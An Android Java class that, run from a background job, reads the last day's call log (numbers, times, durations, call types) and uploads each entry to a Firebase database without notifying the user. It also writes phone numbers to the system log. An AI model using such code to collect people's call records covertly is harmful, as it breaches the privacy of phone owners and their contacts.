package com.app4you.jobscheduler;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.SystemClock;
import android.provider.CallLog;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.gson.Gson;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class AddContactToFB {
    Context mContext;
    DatabaseReference mDatabase;

    public void callMethod(Context mContext) {

        this.mContext = mContext;

        Log.e("Info ", " Service is Called");

        Log.e("Info ", "   " + SystemClock.elapsedRealtime());

        // Toast.makeText(mContext, "Service call", Toast.LENGTH_SHORT).show();

        mDatabase = FirebaseDatabase.getInstance().getReference();
        readContact();
    }


    String[] mSelectionArgs = {createDate()};

    private void readContact() {
        String[] projection = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };
        @SuppressLint("MissingPermission") Cursor c = mContext.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, android.provider.CallLog.Calls.DATE + " >= ?",
                mSelectionArgs, CallLog.Calls.DATE + " DESC");

        StringBuilder sb = new StringBuilder();
        SimpleDateFormat formatter = new SimpleDateFormat("d:MM:yyyy/hh:mm:ss aa");
        if (c.getCount() > 0) {
            c.moveToFirst();
            do {

                String callTypeStr = "";

                String callerNumber = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                long callDateandTime = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                long callDuration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                int callType = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));

                if(callerNumber.length()==13)
                    callerNumber=callerNumber.substring(3);
                String callDetials[] = formatter.format(new Date(callDateandTime)).split("/");


                if (callType == CallLog.Calls.INCOMING_TYPE) {
                    //incoming call
                    callTypeStr = "Incoming";
                } else if (callType == CallLog.Calls.OUTGOING_TYPE) {
                    //outgoing call
                    callTypeStr = "Outgoing";
                } else if (callType == CallLog.Calls.MISSED_TYPE) {
                    //missed call
                    callTypeStr = "Missed";
                }
                sb.append("\n NO -> " + callerNumber + "  Type ->  " + callTypeStr + "  Time -> " + callDetials[1] + "   Duration(s)  ->" + setDuration("" + callDuration));

                IncomingCallPoojo poojo = new IncomingCallPoojo("" + callDateandTime, callerNumber, callDetials[0], callDetials[1], setDuration("" + callDuration), callTypeStr);
                Gson gson = new Gson();
                Log.e("info ", " Entery -> " + gson.toJson(poojo));
                mDatabase.child(mContext.getString(R.string.getRoot)).child(poojo.date).child("" + callDateandTime).setValue(poojo);
            } while (c.moveToNext());

        }
        Log.e("info ", " Final Result =>  " + sb);

    }

    public String createDate() {
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.DATE, -1);
        return String.valueOf(calendar.getTimeInMillis());

    }

    private String setDuration(String time) {
        int input = Integer.parseInt(time);

        if (input > 0) {
            int numberOfHours = (input % 86400) / 3600;
            int numberOfMinutes = ((input % 86400) % 3600) / 60;
            int numberOfSeconds = ((input % 86400) % 3600) % 60;

            String timeStr = "";
            if (numberOfHours > 0)
                timeStr += numberOfHours + "H:";

            if (numberOfMinutes > 0)
                timeStr += numberOfMinutes + "M:";

            if (numberOfSeconds > 0)
                timeStr += numberOfSeconds + "S";

            return timeStr;
        } else
            return "0s";
    }


 /*   class DoTaskInBG extends AsyncTask<Void, Void, Void> {


        @Override
        protected Void doInBackground(Void... voids) {

            {
                String[] projection = new String[]{
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION,
                        CallLog.Calls.TYPE
                };
                @SuppressLint("MissingPermission") Cursor c = mContext.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, android.provider.CallLog.Calls.DATE + " >= ?",
                        mSelectionArgs, CallLog.Calls.DATE + " DESC");

                StringBuilder sb = new StringBuilder();
                SimpleDateFormat formatter = new SimpleDateFormat("d:mm:yyyy h:mmaa");
                if (c.getCount() > 0) {
                    c.moveToFirst();
                    do {

                        String callTypeStr = "";

                        String callerNumber = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                        long callDateandTime = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                        long callDuration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                        int callType = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));

                        String callDetials[] = formatter.format(new Date(callDateandTime)).split(" ");


                        if (callType == CallLog.Calls.INCOMING_TYPE) {
                            //incoming call
                            callTypeStr = "Incoming";
                        } else if (callType == CallLog.Calls.OUTGOING_TYPE) {
                            //outgoing call
                            callTypeStr = "Outgoing";
                        } else if (callType == CallLog.Calls.MISSED_TYPE) {
                            //missed call
                            callTypeStr = "Missed";
                        }
                        sb.append("\n NO -> " + callerNumber + "  Type ->  " + callTypeStr + "  Time -> " + callDetials[1] + "   Duration(s)  ->" + setDuration("" + callDuration));

                        IncomingCallPoojo poojo = new IncomingCallPoojo(callerNumber, callDetials[0], callDetials[1], setDuration("" + callDuration));

                        mDatabase.child(mContext.getString(R.string.getRoot)).child(poojo.date).child(poojo.time).setValue(poojo);
                    } while (c.moveToNext());

                }
                Log.e("info ", " Final Result =>  " + sb);

            }

            return null;
        }
    }*/

}
